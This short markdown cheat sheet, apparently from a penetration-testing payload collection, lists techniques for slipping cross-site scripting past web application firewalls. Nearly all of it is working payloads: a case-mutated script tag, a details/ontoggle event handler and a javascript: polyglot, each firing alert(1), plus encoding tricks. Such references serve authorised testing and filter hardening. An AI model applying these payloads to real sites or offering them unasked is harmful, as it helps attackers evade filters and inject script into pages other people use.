# WAF Bypass

## Summary
Bypass web application firewall rules.

## Techniques
- Case mutation: `<ScRiPt>alert(1)</sCrIpT>`
- Encoding: URL, Unicode, HTML entities, double URL
- Unusual tags: `<details/open/ontoggle=alert(1)>`
- Polyglots: `jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert(1) )`
